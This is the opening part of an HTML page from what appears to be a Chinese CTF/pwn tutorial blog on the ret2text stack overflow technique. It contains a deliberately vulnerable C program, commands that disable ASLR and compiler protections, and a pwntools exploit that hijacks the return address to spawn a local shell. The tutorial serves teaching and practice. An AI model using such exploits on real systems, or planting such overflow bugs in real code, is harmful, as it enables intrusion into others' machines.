@@ -1,0 +1,1485 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="ret2text Return-to-text (ret2text) 是一种利用技术，它通过劫持程序的控制流并重定向到已存在的可执行文本（即程序代码）的某个位置来执行任意代码。\n漏洞源码 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 #include&lt;stdio.h&gt; #include&lt;stdlib.h&gt; char sh[] = &#34;/bin/sh&#34;; int func() { system(sh); return 0; } int dofunc() { char data[8]={}; puts(&#34;input:&#34;); read(0,data,0x100); return 0; } int main() { dofunc(); return 0; } ASLR ASLR（Address Space Layout Randomization）会随机化进程在内存中的关键区域位置。每次进程启动时，堆、栈、共享库和可执行文件的加载地址都会被随机化。这使得攻击者难以预测内存地址，从而增加了利用漏洞的难度。一般情况下都关闭。\n">
+<title>Ret2text</title>
+
+<link rel='canonical' href='https://Pwn3r4llD4ys.github.io/p/ret2text/'>
+
+<link rel="stylesheet" href="/scss/style.min.0304c6baf04e01a8fe70693791cb744d56a3578a3120a8796cefc66825aa39c7.css"><meta property='og:title' content="Ret2text">
+<meta property='og:description' content="ret2text Return-to-text (ret2text) 是一种利用技术，它通过劫持程序的控制流并重定向到已存在的可执行文本（即程序代码）的某个位置来执行任意代码。\n漏洞源码 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 #include&lt;stdio.h&gt; #include&lt;stdlib.h&gt; char sh[] = &#34;/bin/sh&#34;; int func() { system(sh); return 0; } int dofunc() { char data[8]={}; puts(&#34;input:&#34;); read(0,data,0x100); return 0; } int main() { dofunc(); return 0; } ASLR ASLR（Address Space Layout Randomization）会随机化进程在内存中的关键区域位置。每次进程启动时，堆、栈、共享库和可执行文件的加载地址都会被随机化。这使得攻击者难以预测内存地址，从而增加了利用漏洞的难度。一般情况下都关闭。\n">
+<meta property='og:url' content='https://Pwn3r4llD4ys.github.io/p/ret2text/'>
+<meta property='og:site_name' content='Pwn3r4llD4ys'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='栈' /><meta property='article:tag' content='栈溢出' /><meta property='article:tag' content='ret2text' /><meta property='article:published_time' content='2024-10-27T12:12:18&#43;08:00'/><meta property='article:modified_time' content='2024-10-27T12:12:18&#43;08:00'/>
+<meta name="twitter:title" content="Ret2text">
+<meta name="twitter:description" content="ret2text Return-to-text (ret2text) 是一种利用技术，它通过劫持程序的控制流并重定向到已存在的可执行文本（即程序代码）的某个位置来执行任意代码。\n漏洞源码 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 #include&lt;stdio.h&gt; #include&lt;stdlib.h&gt; char sh[] = &#34;/bin/sh&#34;; int func() { system(sh); return 0; } int dofunc() { char data[8]={}; puts(&#34;input:&#34;); read(0,data,0x100); return 0; } int main() { dofunc(); return 0; } ASLR ASLR（Address Space Layout Randomization）会随机化进程在内存中的关键区域位置。每次进程启动时，堆、栈、共享库和可执行文件的加载地址都会被随机化。这使得攻击者难以预测内存地址，从而增加了利用漏洞的难度。一般情况下都关闭。\n">
+    <link rel="shortcut icon" href="/favicon.ico" />
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu2032356966516602474.jpg" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Pwn3r4llD4ys</a></h1>
+            <h2 class="site-description">Code is cheap , show me your flag.</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://space.bilibili.com/393835650'
+                        target="_blank"
+                        title="Bilibili"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg  xmlns="http://www.w3.org/2000/svg"  width="24"  height="24"  viewBox="0 0 24 24"  fill="none"  stroke="currentColor"  stroke-width="2"  stroke-linecap="round"  stroke-linejoin="round"  class="icon icon-tabler icons-tabler-outline icon-tabler-brand-bilibili"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M3 10a4 4 0 0 1 4 -4h10a4 4 0 0 1 4 4v6a4 4 0 0 1 -4 4h-10a4 4 0 0 1 -4 -4v-6z" /><path d="M8 3l2 3" /><path d="M16 3l-2 3" /><path d="M9 13v-2" /><path d="M15 11v2" /></svg>
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://github.com/Pwn3r4llD4ys/'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>归档</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>搜索</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>友情链接</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+                    
+                        <li id="i18n-switch">  
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-language" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M4 5h7" />
+  <path d="M9 3v2c0 4.418 -2.239 8 -5 8" />
+  <path d="M5 9c-.003 2.144 2.952 3.908 6.7 4" />
+  <path d="M12 20l4 -9l4 9" />
+  <path d="M19.1 18h-6.2" />
+</svg>
+
+
+
+                            <select name="language" title="language" onchange="window.location.href = this.selectedOptions[0].value">
+                                
+                                    <option value="https://Pwn3r4llD4ys.github.io/en/" >English</option>
+                                
+                                    <option value="https://Pwn3r4llD4ys.github.io/" selected>中文</option>
+                                
+                            </select>
+                        </li>
+                    
+                
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#漏洞源码">漏洞源码</a></li>
+    <li><a href="#aslr">ASLR</a></li>
+    <li><a href="#x86">x86</a>
+      <ol>
+        <li><a href="#查看保护机制">查看保护机制</a></li>
+        <li><a href="#dofunc栈帧">dofunc栈帧</a></li>
+        <li><a href="#反编译dofunc">反编译dofunc</a></li>
+        <li><a href="#exp">exp</a></li>
+      </ol>
+    </li>
+    <li><a href="#x86_seq">x86_seq</a></li>
+    <li><a href="#x64">x64</a>
+      <ol>
+        <li><a href="#exp-1">exp</a></li>
+        <li><a href="#x64堆栈平衡">x64堆栈平衡</a></li>
+      </ol>
+    </li>
+  </ol>
+
+  <ol>
+    <li><a href="#函数调用约定">函数调用约定</a></li>
+    <li><a href="#x86-1">x86</a>
+      <ol>
+        <li><a href="#编译调试">编译&amp;调试</a></li>
+        <li><a href="#exp-2">exp</a></li>
+      </ol>
+    </li>
+    <li><a href="#x64-1">x64</a>
+      <ol>
+        <li><a href="#rop">ROP</a></li>
+      </ol>
+    </li>
+    <li><a href="#减少溢出空间">减少溢出空间</a></li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/pwn/" >
+                Pwn
+            </a>
+        
+            <a href="/categories/stack/" >
+                Stack
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/ret2text/">Ret2text</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">2024-10-27</time>
+            </div>
+        
+
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h1 id="ret2text">ret2text
+</h1><p><strong>Return-to-text</strong> (ret2text) 是一种利用技术，它通过劫持程序的控制流并重定向到已存在的可执行文本（即程序代码）的某个位置来执行任意代码。</p>
+<h2 id="漏洞源码">漏洞源码
+</h2><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span><span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span><span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="kt">char</span> <span class="n">sh</span><span class="p">[]</span> <span class="o">=</span> <span class="s">&#34;/bin/sh&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">func</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">system</span><span class="p">(</span><span class="n">sh</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">dofunc</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">char</span> <span class="n">data</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span><span class="o">=</span><span class="p">{};</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">puts</span><span class="p">(</span><span class="s">&#34;input:&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">data</span><span class="p">,</span><span class="mh">0x100</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">dofunc</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="aslr">ASLR
+</h2><p><strong>ASLR</strong>（Address Space Layout Randomization）会随机化进程在内存中的关键区域位置。每次进程启动时，堆、栈、共享库和可执行文件的加载地址都会被随机化。这使得攻击者难以预测内存地址，从而增加了利用漏洞的难度。一般情况下都关闭。</p>
+<p><strong>临时关闭</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="nb">echo</span> <span class="m">0</span> <span class="p">|</span> sudo tee /proc/sys/kernel/randomize_va_space
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>永久关闭</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;kernel.randomize_va_space = 0&#34;</span> <span class="p">|</span> sudo tee -a /etc/sysctl.conf
+</span></span><span class="line"><span class="cl">sudo sysctl -p
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="x86">x86
+</h2><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">gcc ret2text.c -m32 -fno-stack-protector -no-pie -o ret2text_x86
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>
+<p><strong>-m32 生成32位程序</strong></p>
+</li>
+<li>
+<p><strong>-fno-stack-protector 禁用栈保护机制（Stack Protector）</strong></p>
+<p>栈保护机制通过在栈上放置一个 &ldquo;canary&rdquo; 值来检测栈溢出漏洞</p>
+</li>
+<li>
+<p><strong>-no-pie 禁用位置无关可执行文件（Position Independent Executable, PIE）</strong></p>
+<p>位置无关可执行文件使得代码在不同的内存地址运行，每次加载都会随机化地址空间</p>
+</li>
+</ul>
+<h3 id="查看保护机制">查看保护机制
+</h3><p><img src="/p/ret2text/ret2text1.png"
+	width="415"
+	height="209"
+	srcset="/p/ret2text/ret2text1_hu12204607155125985906.png 480w, /p/ret2text/ret2text1_hu6273201861817395484.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="198"
+		data-flex-basis="476px"
+	
+></p>
+<h3 id="dofunc栈帧">dofunc栈帧
+</h3><p>esp -&gt; 0xffffd330</p>
+<p>ebp -&gt; 0xffffd358</p>
+<p><strong>ebp和esp的差值是0x18中，0x18=0x4(保存ebx) + 0x14(开辟栈帧)</strong></p>
+<p><img src="/p/ret2text/dofunc1.png"
+	width="1026"
+	height="549"
+	srcset="/p/ret2text/dofunc1_hu3028956390678617741.png 480w, /p/ret2text/dofunc1_hu4694787245494610969.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="186"
+		data-flex-basis="448px"
+	
+></p>
+<p><strong>栈帧开辟具体细节</strong></p>
+<ul>
+<li>call dofunc 即 push eip,jmp &amp;dofunc   <strong>保存eip并跳到dofunc的首地址</strong></li>
+<li>push ebp   <strong>保存上一个栈帧的ebp</strong></li>
+<li>mov ebp,esp   <strong>ebp和esp指向同一地址，此时栈帧空间为0</strong></li>
+<li>sub esp.0x20   <strong>esp向低地址移动开辟新的栈帧</strong></li>
+</ul>
+<p><strong>栈帧清除具体细节</strong></p>
+<ul>
+<li>leave 即 mov esp,ebp pop ebp   <strong>新的栈帧关闭，ebp变为0xffffd358</strong></li>
+<li>ret 即 pop eip   <strong>返回之前eip的地址</strong></li>
+</ul>
+<p><img src="/p/ret2text/dofunc2.png"
+	width="491"
+	height="308"
+	srcset="/p/ret2text/dofunc2_hu15746019102504271762.png 480w, /p/ret2text/dofunc2_hu16190054376732096497.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="159"
+		data-flex-basis="382px"
+	
+></p>
+<h3 id="反编译dofunc">反编译dofunc
+</h3><p><img src="/p/ret2text/dofunc3.png"
+	width="468"
+	height="264"
+	srcset="/p/ret2text/dofunc3_hu158563102508775942.png 480w, /p/ret2text/dofunc3_hu12805332951289567137.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="177"
+		data-flex-basis="425px"
+	
+></p>
+<p><strong>查看栈布局</strong></p>
+<p><img src="/p/ret2text/dofunc4.png"
+	width="447"
+	height="403"
+	srcset="/p/ret2text/dofunc4_hu11483822254442310329.png 480w, /p/ret2text/dofunc4_hu9199578970789319021.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="110"
+		data-flex-basis="266px"
+	
+></p>
+<p>从数组的起始地址到保存的eip的地址的差值为<strong>0x10+0x4=0x14</strong></p>
+<p>尝试篡改eip的地址，输入8个a</p>
+<p><img src="/p/ret2text/dofunc5.png"
+	width="709"
+	height="372"
+	srcset="/p/ret2text/dofunc5_hu15833967936365398142.png 480w, /p/ret2text/dofunc5_hu7446371284413477423.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="190"
+		data-flex-basis="457px"
+	
+></p>
+<p>栈溢出的原因是没有对输入的数据长度做限制，过长的输入会覆盖内存中返回地址的数据，如果能输到修改eip的地址值就可以劫持函数流程</p>
+<p><img src="/p/ret2text/dofunc6.png"
+	width="860"
+	height="755"
+	srcset="/p/ret2text/dofunc6_hu11217483084513906239.png 480w, /p/ret2text/dofunc6_hu14340215698699619398.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="113"
+		data-flex-basis="273px"
+	
+></p>
+<p><strong>这里要输入20个a来填充数据，16个a填充栈帧，4个a覆盖ebp，后面加上func的起始地址0x8049186即可</strong></p>
+<p>0x8049186本质上就是4个通过ASCII表映射的字符，其中0x8 0x04 0x91 0x86在ASCII中都是不可打印字符，需要通过pwntools输入</p>
+<h3 id="exp">exp
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">pwn</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 属性设置</span>
+</span></span><span class="line"><span class="cl"><span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;i386&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;linux&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 为当前文件创建进程</span>
+</span></span><span class="line"><span class="cl"><span class="n">filePath</span> <span class="o">=</span> <span class="s1">&#39;./ret2text_x86&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">process</span><span class="p">(</span><span class="n">filePath</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 用gdb附加调试进程，一般不用调试</span>
+</span></span><span class="line"><span class="cl"><span class="n">pwn</span><span class="o">.</span><span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 20个字符和一个32位地址组成payload</span>
+</span></span><span class="line"><span class="cl"><span class="n">padding</span> <span class="o">=</span> <span class="mh">0x14</span>
+</span></span><span class="line"><span class="cl"><span class="n">funcAddr</span> <span class="o">=</span> <span class="mh">0x8049186</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># payload = padding * b&#39;a&#39; + pwn.p32(funcAddr)  # payload使用字符串拼接需要用p32 p64转为小端序</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">flat</span><span class="p">([</span><span class="n">padding</span> <span class="o">*</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="p">,</span> <span class="n">funcAddr</span><span class="p">])</span>  <span class="c1"># flat自动进行数据对齐和大端序小端序调整</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s1">&#39;input:&#39;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>  <span class="c1"># 在程序输出input后发送payload</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>  <span class="c1"># 进入交互模式</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/ret2text/dofunc7.png"
+	width="872"
+	height="711"
+	srcset="/p/ret2text/dofunc7_hu5319536575644334385.png 480w, /p/ret2text/dofunc7_hu3822296061323386253.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="122"
+		data-flex-basis="294px"
+	
+></p>
+<h2 id="x86_seq">x86_seq
+</h2><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">gcc ret2text.c -m32 -fno-stack-protector -no-pie -fomit-frame-pointer -o ret2text_x86_sep
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>相比于上面的程序这里省略了帧指针，增大了调试的难度</strong></p>
+<p>可以看到dofunc直接省略了对ebp的操作</p>
+<p><img src="/p/ret2text/dofunc8.png"
+	width="908"
+	height="287"
+	srcset="/p/ret2text/dofunc8_hu12767516392254179978.png 480w, /p/ret2text/dofunc8_hu15092272576666419590.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="316"
+		data-flex-basis="759px"
+	
+></p>
+<p><strong>省略了帧指针后ebp被当作通用寄存器进行使用，不再用于维护栈帧的边界</strong></p>
+<p><strong>exp和上面相同</strong></p>
+<h2 id="x64">x64
+</h2><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
